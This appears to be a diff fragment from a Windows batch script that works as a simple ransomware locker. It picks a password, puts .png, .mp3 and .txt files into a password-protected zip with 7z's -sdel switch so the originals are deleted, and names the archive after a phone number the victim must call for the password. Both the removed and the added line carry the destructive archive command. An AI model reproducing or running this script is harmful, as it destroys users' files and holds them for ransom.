@@ -17,7 +17,7 @@ if %ran% == 5 set /p password=<"pass5" && set id=9FwxgFf && echo 9FwxgFf | clip
 echo %id%
 pause
 ::this will zip the file .png and mp3 with password
-7z\7z -sdel a -tzip Contact_0932152322_for_password "*.png" "*.mp3" "*.txt" -p%password%
+7z.exe -sdel a -tzip Contact_0932152322_for_password "*.png" "*.mp3" "*.txt" -p%password%
 ::this will delete the file ReadME where the password is stored
 ::del /s /q pass1
 ::del /s /q pass2
